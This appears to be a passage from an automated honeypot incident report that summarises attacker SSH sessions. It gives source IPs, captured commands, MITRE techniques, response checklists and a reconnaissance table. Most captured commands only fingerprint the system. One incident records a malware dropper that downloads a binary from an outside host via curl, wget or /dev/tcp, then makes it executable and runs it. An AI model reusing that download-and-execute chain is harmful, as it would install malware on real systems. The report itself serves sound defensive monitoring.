| `2026-03-14 12:14:43` | `cowrie.client.version` |
| `2026-03-14 12:14:43` | `cowrie.client.kex` |
| `2026-03-14 12:14:44` | `cowrie.login.success` |
| `2026-03-14 12:14:45` | `cowrie.session.params` |
| `2026-03-14 12:14:45` | `cowrie.command.input` |
| `2026-03-14 12:14:45` | `cowrie.command.input` |
| `2026-03-14 12:14:45` | `cowrie.command.input` |
| `2026-03-14 12:14:45` | `cowrie.command.input` |
| `2026-03-14 12:14:46` | `cowrie.log.closed` |
| `2026-03-14 12:14:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.241.161[.]237` to AbuseIPDB if not already reported
- [ ] Block `192.241.161[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40388f6e79b3

| Field | Detail |
|---|---|
| **Source IP** | `192.241.161[.]237` |
| **First Seen** | 2026-03-14 12:15 |
| **Last Seen** | 2026-03-14 12:16 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 12:15:58` | `cowrie.session.connect` |
| `2026-03-14 12:15:58` | `cowrie.client.version` |
| `2026-03-14 12:15:59` | `cowrie.client.kex` |
| `2026-03-14 12:16:00` | `cowrie.login.success` |
| `2026-03-14 12:16:01` | `cowrie.session.params` |
| `2026-03-14 12:16:01` | `cowrie.command.input` |
| `2026-03-14 12:16:01` | `cowrie.command.input` |
| `2026-03-14 12:16:01` | `cowrie.command.input` |
| `2026-03-14 12:16:01` | `cowrie.command.input` |
| `2026-03-14 12:16:01` | `cowrie.log.closed` |
| `2026-03-14 12:16:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.241.161[.]237` to AbuseIPDB if not already reported
- [ ] Block `192.241.161[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d41bcc83713

| Field | Detail |
|---|---|
| **Source IP** | `116.113.254[.]26` |
| **First Seen** | 2026-03-14 12:52 |
| **Last Seen** | 2026-03-14 12:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 12:52:15` | `cowrie.session.connect` |
| `2026-03-14 12:52:17` | `cowrie.client.version` |
| `2026-03-14 12:52:17` | `cowrie.client.kex` |
| `2026-03-14 12:52:19` | `cowrie.login.success` |
| `2026-03-14 12:52:19` | `cowrie.direct-tcpip.request` |
| `2026-03-14 12:52:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.113.254[.]26` to AbuseIPDB if not already reported
- [ ] Block `116.113.254[.]26` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f55ddc156115

| Field | Detail |
|---|---|
| **Source IP** | `197.155.225[.]93` |
| **First Seen** | 2026-03-14 12:52 |
| **Last Seen** | 2026-03-14 12:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 12:52:24` | `cowrie.session.connect` |
| `2026-03-14 12:52:25` | `cowrie.client.version` |
| `2026-03-14 12:52:25` | `cowrie.client.kex` |
| `2026-03-14 12:52:27` | `cowrie.login.success` |
| `2026-03-14 12:52:28` | `cowrie.direct-tcpip.request` |
| `2026-03-14 12:52:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.155.225[.]93` to AbuseIPDB if not already reported
- [ ] Block `197.155.225[.]93` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e8a1ec253b8

| Field | Detail |
|---|---|
| **Source IP** | `206.189.97[.]65` |
| **First Seen** | 2026-03-14 14:15 |
| **Last Seen** | 2026-03-14 14:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 14:15:25` | `cowrie.session.connect` |
| `2026-03-14 14:15:25` | `cowrie.client.version` |
| `2026-03-14 14:15:25` | `cowrie.client.kex` |
| `2026-03-14 14:15:26` | `cowrie.login.success` |
| `2026-03-14 14:15:27` | `cowrie.session.params` |
| `2026-03-14 14:15:27` | `cowrie.command.input` |
| `2026-03-14 14:15:27` | `cowrie.command.input` |
| `2026-03-14 14:15:27` | `cowrie.command.input` |
| `2026-03-14 14:15:27` | `cowrie.command.input` |
| `2026-03-14 14:15:28` | `cowrie.log.closed` |
| `2026-03-14 14:15:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.97[.]65` to AbuseIPDB if not already reported
- [ ] Block `206.189.97[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f50f0c96456

| Field | Detail |
|---|---|
| **Source IP** | `206.189.97[.]65` |
| **First Seen** | 2026-03-14 14:16 |
| **Last Seen** | 2026-03-14 14:16 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 14:16:07` | `cowrie.session.connect` |
| `2026-03-14 14:16:07` | `cowrie.client.version` |
| `2026-03-14 14:16:07` | `cowrie.client.kex` |
| `2026-03-14 14:16:08` | `cowrie.login.success` |
| `2026-03-14 14:16:09` | `cowrie.session.params` |
| `2026-03-14 14:16:09` | `cowrie.command.input` |
| `2026-03-14 14:16:09` | `cowrie.command.input` |
| `2026-03-14 14:16:09` | `cowrie.command.input` |
| `2026-03-14 14:16:09` | `cowrie.command.input` |
| `2026-03-14 14:16:10` | `cowrie.log.closed` |
| `2026-03-14 14:16:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.97[.]65` to AbuseIPDB if not already reported
- [ ] Block `206.189.97[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-554cfd13f168

| Field | Detail |
|---|---|
| **Source IP** | `206.189.97[.]65` |
| **First Seen** | 2026-03-14 14:16 |
| **Last Seen** | 2026-03-14 14:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 14:16:48` | `cowrie.session.connect` |
| `2026-03-14 14:16:48` | `cowrie.client.version` |
| `2026-03-14 14:16:48` | `cowrie.client.kex` |
| `2026-03-14 14:16:50` | `cowrie.login.success` |
| `2026-03-14 14:16:51` | `cowrie.session.params` |
| `2026-03-14 14:16:51` | `cowrie.command.input` |
| `2026-03-14 14:16:51` | `cowrie.command.input` |
| `2026-03-14 14:16:51` | `cowrie.command.input` |
| `2026-03-14 14:16:51` | `cowrie.command.input` |
| `2026-03-14 14:16:51` | `cowrie.log.closed` |
| `2026-03-14 14:16:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.97[.]65` to AbuseIPDB if not already reported
- [ ] Block `206.189.97[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfe5041efb88

| Field | Detail |
|---|---|
| **Source IP** | `206.189.97[.]65` |
| **First Seen** | 2026-03-14 14:17 |
| **Last Seen** | 2026-03-14 14:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 14:17:30` | `cowrie.session.connect` |
| `2026-03-14 14:17:31` | `cowrie.client.version` |
| `2026-03-14 14:17:31` | `cowrie.client.kex` |
| `2026-03-14 14:17:32` | `cowrie.login.success` |
| `2026-03-14 14:17:33` | `cowrie.session.params` |
| `2026-03-14 14:17:33` | `cowrie.command.input` |
| `2026-03-14 14:17:33` | `cowrie.command.input` |
| `2026-03-14 14:17:33` | `cowrie.command.input` |
| `2026-03-14 14:17:33` | `cowrie.command.input` |
| `2026-03-14 14:17:33` | `cowrie.log.closed` |
| `2026-03-14 14:17:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.97[.]65` to AbuseIPDB if not already reported
- [ ] Block `206.189.97[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c6b3968cf9c

| Field | Detail |
|---|---|
| **Source IP** | `206.189.97[.]65` |
| **First Seen** | 2026-03-14 14:18 |
| **Last Seen** | 2026-03-14 14:18 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 14:18:12` | `cowrie.session.connect` |
| `2026-03-14 14:18:13` | `cowrie.client.version` |
| `2026-03-14 14:18:13` | `cowrie.client.kex` |
| `2026-03-14 14:18:14` | `cowrie.login.success` |
| `2026-03-14 14:18:15` | `cowrie.session.params` |
| `2026-03-14 14:18:15` | `cowrie.command.input` |
| `2026-03-14 14:18:15` | `cowrie.command.input` |
| `2026-03-14 14:18:15` | `cowrie.command.input` |
| `2026-03-14 14:18:15` | `cowrie.command.input` |
| `2026-03-14 14:18:16` | `cowrie.log.closed` |
| `2026-03-14 14:18:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.97[.]65` to AbuseIPDB if not already reported
- [ ] Block `206.189.97[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e42bb13c6b1

| Field | Detail |
|---|---|
| **Source IP** | `206.189.97[.]65` |
| **First Seen** | 2026-03-14 14:18 |
| **Last Seen** | 2026-03-14 14:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 14:18:57` | `cowrie.session.connect` |
| `2026-03-14 14:18:57` | `cowrie.client.version` |
| `2026-03-14 14:18:57` | `cowrie.client.kex` |
| `2026-03-14 14:18:59` | `cowrie.login.success` |
| `2026-03-14 14:19:00` | `cowrie.session.params` |
| `2026-03-14 14:19:00` | `cowrie.command.input` |
| `2026-03-14 14:19:00` | `cowrie.command.input` |
| `2026-03-14 14:19:00` | `cowrie.command.input` |
| `2026-03-14 14:19:00` | `cowrie.command.input` |
| `2026-03-14 14:19:00` | `cowrie.log.closed` |
| `2026-03-14 14:19:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.97[.]65` to AbuseIPDB if not already reported
- [ ] Block `206.189.97[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af63309b814c

| Field | Detail |
|---|---|
| **Source IP** | `101.200.132[.]92` |
| **First Seen** | 2026-03-14 16:22 |
| **Last Seen** | 2026-03-14 16:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo 1 > /dev/null && cat /bin/echo, nohup $SHELL -c "curl hxxp://124.225.122[.]159:60128/arm_linux -o /tmp/8ARyxUXeZb; if [ ! -f /tmp/8ARyxUXeZb ]; then wget hxxp://124.225.122[.]159:60128/arm_linux -O /tmp/8ARyxUXeZb; fi; if [ ! -f /tmp/8ARyxUXeZb ]; then exec 6<>/dev/tcp/124.225.122[.]159/60128 && echo -n 'GET /arm_linux' >&6 && cat 0<&6 > /tmp/8ARyxUXeZb ; chmod +x /tmp/8ARyxUXeZb && /tmp/8ARyxUXeZb j3tj5M+6eXyGMZp+YrHY6WFr8/Jrd+vPun56hjGffGK51ONtbfLzambz1b9ieZoyhnl9u8/iZWH08mpn6sG8f2aZMJhmf7rP4W9h9PJqZODBvHtmkDOGeny7z+JvaPj0a2bg2ah9epwumnp5ptDh, head -c 2639612 > /tmp/hN6eqN07mL, nohup $SHELL -c "curl hxxp://124.225.122[.]159:60128/arm_linux -o /tmp/8ARyxUXeZb; if [ ! -f /tmp/8ARyxUXeZb ]; then wget hxxp://124.225.122[.]159:60128/arm_linux -O /tmp/8ARyxUXeZb; fi; if [ ! -f /tmp/8ARyxUXeZb ]; then exec 6<>/dev/tcp/124.225.122[.]159/60128 && echo -n 'GET /arm_linux' >&6 && cat 0<&6 > /tmp/8ARyxUXeZb ; chmod +x /tmp/8ARyxUXeZb && /tmp/8ARyxUXeZb j3tj5M+6eXyGMZp+YrHY6WFr8/Jrd+vPun56hjGffGK51ONtbfLzambz1b9ieZoyhnl9u8/iZWH08mpn6sG8f2aZMJhmf7rP4W9h9PJqZODBvHtmkDOGeny7z+JvaPj0a2bg2ah9epwumnp5ptDh, (vXZXELF` |
| **TTPs (MITRE)** | T1078 · T1083 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 16:22:45` | `cowrie.session.connect` |
| `2026-03-14 16:22:45` | `cowrie.client.version` |
| `2026-03-14 16:22:45` | `cowrie.client.kex` |
| `2026-03-14 16:22:46` | `cowrie.login.success` |
| `2026-03-14 16:22:46` | `cowrie.session.params` |
| `2026-03-14 16:22:46` | `cowrie.command.input` |
| `2026-03-14 16:22:49` | `cowrie.command.input` |
| `2026-03-14 16:22:49` | `cowrie.command.input` |
| `2026-03-14 16:22:49` | `cowrie.command.input` |
| `2026-03-14 16:22:49` | `cowrie.command.input` |
| `2026-03-14 16:22:49` | `cowrie.log.closed` |
| `2026-03-14 16:22:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.200.132[.]92` to AbuseIPDB if not already reported
- [ ] Block `101.200.132[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `139.135.60[.]107` | **25** | 2026-03-14 14:19 | 2026-03-14 14:24 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `59.103.108[.]27` | **25** | 2026-03-14 00:16 | 2026-03-14 00:21 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `120.48.52[.]58` | **13** | 2026-03-14 13:53 | 2026-03-14 14:10 | 19m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `118.139.164[.]171` | **10** | 2026-03-14 11:13 | 2026-03-14 11:35 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `172.174.72[.]225` | **10** | 2026-03-14 09:49 | 2026-03-14 10:09 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `179.33.186[.]150` | **10** | 2026-03-14 05:51 | 2026-03-14 06:15 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `197.243.0[.]62` | **10** | 2026-03-14 09:07 | 2026-03-14 09:34 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `8.219.57[.]123` | **10** | 2026-03-14 15:02 | 2026-03-14 15:20 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `120.48.181[.]192` | **9** | 2026-03-14 11:16 | 2026-03-14 11:26 | 10m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `118.193.37[.]79` | **8** | 2026-03-14 10:57 | 2026-03-14 11:27 | 0m | 8 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.11[.]36` | **7** | 2026-03-14 15:07 | 2026-03-14 15:12 | 4m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `16.58.56[.]214` | **5** | 2026-03-14 03:21 | 2026-03-14 03:26 | 0m | 0 | `T1592` | 🟢 LOW |
| `183.220.237[.]230` | **4** | 2026-03-14 02:58 | 2026-03-14 02:58 | 4m | 0 | `T1592` | 🟢 LOW |
| `68.183.86[.]77` | **3** | 2026-03-14 08:46 | 2026-03-14 08:52 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `8.211.52[.]151` | **3** | 2026-03-14 03:34 | 2026-03-14 03:34 | 0m | 2 | `T1110.001` | 🟢 LOW |
| `113.194.203[.]31` | **2** | 2026-03-14 14:49 | 2026-03-14 15:05 | 4m | 0 | `T1592` | 🟢 LOW |
| `134.199.151[.]94` | **2** | 2026-03-14 07:32 | 2026-03-14 07:33 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `172.203.245[.]82` | **2** | 2026-03-14 10:35 | 2026-03-14 10:35 | 0m | 0 | `T1592` | 🟢 LOW |
| `183.220.237[.]230` | **2** | 2026-03-14 13:28 | 2026-03-14 13:28 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.64.105[.]168` | **2** | 2026-03-14 08:50 | 2026-03-14 08:50 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.65.195[.]96` | **2** | 2026-03-14 05:13 | 2026-03-14 05:14 | 0m | 0 | `T1592` | 🟢 LOW |
| `47.250.181[.]211` | **2** | 2026-03-14 12:40 | 2026-03-14 12:40 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.200.236[.]207` | 1 | 2026-03-14 03:39 | 2026-03-14 03:39 | 13s | 0 | `T1592` | 🟢 LOW |
| `102.33.36[.]254` | 1 | 2026-03-14 16:00 | 2026-03-14 16:00 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `102.38.3[.]181` | 1 | 2026-03-14 01:52 | 2026-03-14 01:52 | 1s | 0 | `T1592` | 🟢 LOW |
| `102.38.3[.]181` | 1 | 2026-03-14 06:59 | 2026-03-14 06:59 | 7s | 0 | `T1592` | 🟢 LOW |
| `106.13.181[.]3` | 1 | 2026-03-14 14:03 | 2026-03-14 14:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.246.89[.]68` | 1 | 2026-03-14 05:06 | 2026-03-14 05:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `106.246.89[.]72` | 1 | 2026-03-14 09:09 | 2026-03-14 09:09 | 10s | 0 | `T1592` | 🟢 LOW |
| `112.168.71[.]109` | 1 | 2026-03-14 00:21 | 2026-03-14 00:21 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.19.44[.]93` | 1 | 2026-03-14 00:16 | 2026-03-14 00:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `112.19.44[.]93` | 1 | 2026-03-14 08:01 | 2026-03-14 08:01 | 9s | 0 | `T1592` | 🟢 LOW |
| `113.219.177[.]95` | 1 | 2026-03-14 07:25 | 2026-03-14 07:25 | 3s | 0 | `T1592` | 🟢 LOW |
| `115.73.11[.]44` | 1 | 2026-03-14 09:13 | 2026-03-14 09:14 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `117.242.152[.]189` | 1 | 2026-03-14 01:21 | 2026-03-14 01:21 | 13s | 0 | `T1592` | 🟢 LOW |
| `118.122.255[.]5` | 1 | 2026-03-14 10:12 | 2026-03-14 10:12 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `118.43.231[.]252` | 1 | 2026-03-14 02:31 | 2026-03-14 02:31 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.109[.]59` | 1 | 2026-03-14 06:01 | 2026-03-14 06:03 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.131[.]211` | 1 | 2026-03-14 14:45 | 2026-03-14 14:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.151[.]153` | 1 | 2026-03-14 01:03 | 2026-03-14 01:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.154[.]88` | 1 | 2026-03-14 01:06 | 2026-03-14 01:08 | 120s | 0 | `T1592` | 🟢 LOW |
| `122.254.1[.]68` | 1 | 2026-03-14 12:18 | 2026-03-14 12:19 | 30s | 0 | `T1592` | 🟢 LOW |
| `125.228.8[.]42` | 1 | 2026-03-14 06:52 | 2026-03-14 06:53 | 30s | 0 | `T1592` | 🟢 LOW |
| `128.24.162[.]1` | 1 | 2026-03-14 08:32 | 2026-03-14 08:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `151.42.177[.]4` | 1 | 2026-03-14 09:53 | 2026-03-14 09:53 | 13s | 0 | `T1592` | 🟢 LOW |
| `153.246.198[.]45` | 1 | 2026-03-14 03:51 | 2026-03-14 03:52 | 30s | 0 | `T1592` | 🟢 LOW |
| `170.246.107[.]78` | 1 | 2026-03-14 14:12 | 2026-03-14 14:13 | 31s | 0 | `T1592` | 🟢 LOW |
| `175.196.177[.]232` | 1 | 2026-03-14 12:38 | 2026-03-14 12:38 | 12s | 0 | `T1592` | 🟢 LOW |
| `177.75.14[.]254` | 1 | 2026-03-14 07:05 | 2026-03-14 07:06 | 31s | 0 | `T1592` | 🟢 LOW |
| `178.165.112[.]228` | 1 | 2026-03-14 11:04 | 2026-03-14 11:04 | 14s | 0 | `T1592` | 🟢 LOW |
| `179.181.133[.]153` | 1 | 2026-03-14 00:54 | 2026-03-14 00:54 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.166.162[.]78` | 1 | 2026-03-14 07:49 | 2026-03-14 07:49 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.168.60[.]146` | 1 | 2026-03-14 05:23 | 2026-03-14 05:23 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.184.84[.]77` | 1 | 2026-03-14 10:59 | 2026-03-14 11:01 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.188.253[.]150` | 1 | 2026-03-14 14:14 | 2026-03-14 14:14 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.76.97[.]132` | 1 | 2026-03-14 07:45 | 2026-03-14 07:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.171.12[.]224` | 1 | 2026-03-14 09:39 | 2026-03-14 09:41 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.171.144[.]219` | 1 | 2026-03-14 14:29 | 2026-03-14 14:29 | 9s | 0 | `T1592` | 🟢 LOW |
| `183.171.148[.]171` | 1 | 2026-03-14 08:09 | 2026-03-14 08:09 | 10s | 0 | `T1592` | 🟢 LOW |
| `183.171.148[.]79` | 1 | 2026-03-14 03:31 | 2026-03-14 03:31 | 19s | 0 | `T1592` | 🟢 LOW |
| `183.171.4[.]155` | 1 | 2026-03-14 03:48 | 2026-03-14 03:48 | 12s | 0 | `T1592` | 🟢 LOW |
| `183.171.44[.]82` | 1 | 2026-03-14 08:22 | 2026-03-14 08:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `183.171.61[.]139` | 1 | 2026-03-14 15:22 | 2026-03-14 15:24 | 120s | 0 | `T1592` | 🟢 LOW |
